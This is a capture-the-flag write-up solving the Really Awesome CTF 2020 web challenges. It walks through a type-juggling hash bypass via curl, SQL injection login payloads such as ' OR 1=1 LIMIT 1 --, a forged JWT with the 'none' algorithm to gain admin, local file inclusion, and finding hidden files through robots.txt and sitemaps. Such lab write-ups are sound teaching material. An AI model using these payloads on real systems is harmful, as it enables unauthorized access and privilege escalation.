# Really Awesome CTF 2020

Fri, 05 June 2020, 19:00 CEST — Tue, 09 June 2020, 19:00 CEST

Write-ups of Web challenges

# Web

![web chall](/RACTF_2020/RACTF.png)

## C0llide
```
A target service is asking for two bits of information that have the same "custom hash", but can't be identical.
Looks like we're going to have to generate a collision?
```

The service source code is:
``` javascript
[...]
const app = express()
app.use(bodyParser.json())

const port = 3000
const flag = ???
const secret_key = ???
[...]
app.post('/getflag', (req, res) => {
    if (!req.body)
        return res.send("400")
    let one = req.body.one
    let two = req.body.two
    if (!one || !two)
        return res.send("400")
    if ((one.length !== two.length) || (one === two))
        return res.send("Strings are either too different or not different enough")
    one = customhash.hash(secret_key + one)
    two = customhash.hash(secret_key + two)
    if (one == two)
        return res.send(flag)
    else
        return res.send(`${one} did not match ${two}!`)
})

app.listen(port, () => console.log(`Listening on port ${port}`))
```

To connect to this challenge, we use `curl`:

``` bash
> curl -H "Content-Type: application/json" -d '{"one":"abc","two":"xyz"}' -X POST http://88.198.219.20:60254/getflag
8c8811e4d989cb695491dd9f75f72df6 did not match df86fa719ecb791ad0ce93e93d616378!
```

To solve this challenge, we request:
``` bash
> curl -H "Content-Type: application/json" -d '{"one":[],"two":[]}' -X POST http://88.198.219.20:60254/getflag
ractf{Y0u_R_ab0uT_2_h4Ck_t1Me__4re_u_sur3?}
```

Why it work ?

`req.body.one` and `req.body.two` exist

`one` and `two` have the same size because both are empty array (`0`)

And `one` and `two` don't have the same value because there are two different objects (see Object-oriented programming)

However, an empty array casted in string return nothing, so `secret_key + one` and `secret_key + two` are same and therefore the same for their hash

The flag is `ractf{Y0u_R_ab0uT_2_h4Ck_t1Me__4re_u_sur3?}`

## Quarantine - Hidden information
```We think there's a file they don't want people to see hidden somewhere! See if you can find it, it's gotta be on their webapp somewhere...```

There is a hidden file which not supposed seen

The only files which are not supposed to be seen are listed in the `Disallow` fields in robots.txt file

And, there is a file `robots.txt`
```
User-Agent: *
Disallow: /admin-stash
```

The disallowed file is admin-stash and in it, we can see the flag: `ractf{1m_n0t_4_r0b0T}`

## Quarantine
```See if you can get access to an account on the webapp.```

At the website, we have a basic login form with username and password

When we logged with `'` as username and an empty password, the website return an Internal Server Error, so there is a SQL vulnerability

With `' OR 1=1 --`, the website return `Attempting to login as more than one user!??` because we try to log in as all users in the same time

Then, with `' OR 1=1 LIMIT 1 --`, we logged in as the first user in the database

The flag is finally shown when we have access to an account: `ractf{Y0u_B3tt3r_N0t_h4v3_us3d_sqlm4p}`

## Getting admin
```See if you can get an admin account.```

On the same website, we should open the admin page, but we are redirected to home page because we haven't the admin privilege

We have un cookie `auth` with value `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogIkhhcnJ5IiwgInByaXZpbGVnZSI6IDF9.A7OHDo-b3PB5XONTRuTYq6jm2Ab8iaT353oc-VPPNMU`

It looks like a JWT fomat (https://jwt.io/introduction/)

The first part is the header encode in base64: `{"typ":"JWT","alg":"HS256"}`

The second part is the data encode in base64: `{"user": "Harry", "privilege": 1}`

And the last one is the signature which is unreadable

In the data section, the `privilege` field is interested to upgrade the Harry's account as admin but we can't regenerate the signature

However, it is possible to change the encryption algorithm from `HS256` to `none` and remove the signature section and verification

So we can change the cookie by `{"typ":"JWT","alg":"none"}{"user": "Harry", "privilege": 1}` `(eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VyIjogIkhhcnJ5IiwgInByaXZpbGVnZSI6IDF9.)` and it work !

Finaly, we change the `privilege` by `2`, `{"typ":"JWT","alg":"none"}{"user": "Harry", "privilege": 2}` `(eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VyIjogIkhhcnJ5IiwgInByaXZpbGVnZSI6IDJ9.)`

Refresh and we can open the admin page and read the flag: `ractf{j4va5cr1pt_w3b_t0ken}`

## Finding server information
```See if you can find the source, we think it's called app.py```

On the same website, we can play 3 different videos with urls:

```
http://url/watch/HMHT.mp4
http://url/watch/TIOK.mp4
http://url/watch/TCYI.mp4
```

The page watch seems has a rule which transform `http://url/watch/movie.mp4` in `http://url/watch?path=movie.mp4`

We can try if a Local File Inclusion is possible with `http://url/watch/app.py`

Bingo, in source code of the page we can read:

``` html
<video controls src="data:video/mp4;base64,ractf{qu3ry5tr1ng_m4n1pul4ti0n}"></video>
```

The flag is: `ractf{qu3ry5tr1ng_m4n1pul4ti0n}`

## Insert witty name
```
Having access to the site's source would be really useful, but we don't know how we could get it.
All we know is that the site runs python.
```

In the source of page `http://url`, we can read:
``` html
<link rel="stylesheet" href="/static?f=index.css">
```

There seems to have a Local File Inclusion, the page `http://url/static?` without file argument return an error page:
```
TypeError

TypeError: expected str, bytes or os.PathLike object, not NoneType
Traceback (most recent call last)

[...]

File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
File "/srv/raro/main.py", line 214, in css
    return send_from_directory("static", name)
File "/usr/local/lib/python3.8/site-packages/flask/helpers.py", line 760, in send_from_directory
    filename = fspath(filename)
[...]
```

All traceback are refered to file of python libraries expect one, refered to `/srv/raro/main.py` which seem be a source file of the website

The page `http://url/static?f=main.py` return:
``` python
from application import main
import sys

# ractf{d3velopersM4keM1stake5}

if __name__ == "__main__":
    main(*sys.argv)
```

The flag is: `ractf{d3velopersM4keM1stake5}`

## Entrypoint
```
Sadly it looks like there wasn't much to see in the python source.
We suspect we may be able to login to the site using backup credentials, but we're not sure where they might be.
Encase the password you find in ractf{...} to get the flag.
```

In source of the page `http://url`, we can read:
``` html
<!--
    In case I forget: Backup password is at ./backup.txt
-->
```

But the file` http://url/backup.txt` unexist

However, there is a `robots.txt` file:
```
User-Agent: *
Disallow: /admin
Disallow: /wp-admin
Disallow: /admin.php
Disallow: /static
```

And in `static` directory, there is the file `backup.txt` (`http://url/static/backup.txt`):
```
develop    developerBackupCode4321

Make sure to log out after using!

TODO: Setup a new password manager for this
```

The flag is: `ractf{developerBackupCode4321}`

## Baiting
```
That user list had a user called loginToGetFlag. Well, what are you waiting for?
```

We have to log in with unername `loginToGetFlag` but we can't guess the password, so we must try SQL injection

With `'` as username, the website return an error page:
``` python
Traceback (most recent call last):
  File "/srv/raro/main.py", line 130, in index
    cur.execute("SELECT algo FROM users WHERE username='{}'".
format(sqlite3.OperationalError: unrecognized token: "'''"
```

Here the SQL query is `SELECT algo FROM users WHERE username=''' [...]` and crash because an `'` isn't closed

With `loginToGetFlag' --` as username, the query is `SELECT algo FROM users WHERE username='loginToGetFlag' -- ' [...]`

It select the user `loginToGetFlag` and ignore the end of the query after `--`

Finally, we are logged as `loginToGetFlag` and we can read the flag: `ractf{injectingSQLLikeNobody'sBusiness}`

## Admin Attack
```
Looks like we managed to get a list of users.
That admin user looks particularly interesting, but we don't have their password.
Try and attack the login form and see if you can get anything.
```

Like the **Baiting** challenge, we still use the SQL injection but we can't use the same method

With `' OR 1=1 LIMIT 1 --` as username, we are logged as the first user (`xxslayer420`) in table `users`

With `' OR 1=1 LIMIT 1,1 --` as username, we are logged as the second user which is `jimmyTehAdmin` and the flag `ractf{!!!4dm1n4buse!!!}` is show

The table `users` seems to look like:

id | username | role
---|----------|-------
0 | xxslayer420 | user
1 | jimmyTehAdmin | admin
2 | loginToGetFlag | user (show flag of **Baiting** chall)
3 | pwnboy | user
4 | 3ht0n43br3m4g | user
5 | pupperMaster | user
6 | h4tj18_8055m4n | user
7 | develop | developer (show flag of **Entrypoint** chall)

The flag is: `ractf{!!!4dm1n4buse!!!}`

## Xtremely Memorable Listing
```
We've been asked to test a web application, and we suspect there's a file they used to provide to search engines, but we can't remember what it used to be called.
Can you have a look and see what you can find?
```

The title of the challenge let think that an XML file is hidden somewhere...

Search engines can read the robots.txt file, and after search a documentation about it (https://moz.com/learn/seo/robotstxt), we can learn the existence of the `Sitemap` rule which requiered an XML file.

The default path of the sitemap file is `http://url/sitemap.xml`, and this file exist on the website:
``` XML
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
   <url>
      <loc>https://fake.site/</loc>
      <lastmod>2019-12-12</lastmod>
      <changefreq>always</changefreq>
   </url>
   <!--Backup version at sitemap.xml.bak-->
</urlset> 
```

We can go check the backup sitemap at `http://url/sitemap.xml.bak`:
``` XML
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
   <url>
      <loc>https://fake.site/</loc>
      <lastmod>2019-12-12</lastmod>
      <changefreq>always</changefreq>
   </url>
   <url>
      <loc>https://fake.site/_journal.txt</loc>
      <lastmod>2019-12-12</lastmod>
      <changefreq>always</changefreq>
   </url>
</urlset>
```

And then `http://url/_journal.txt`:
```
[...]
Dear diary,
Today some strange men turned up at my door. They started
shouting at me and one of them pul- ractf{4l13n1nv4s1on?}
[...]
```

The flag is: `ractf{4l13n1nv4s1on?}`
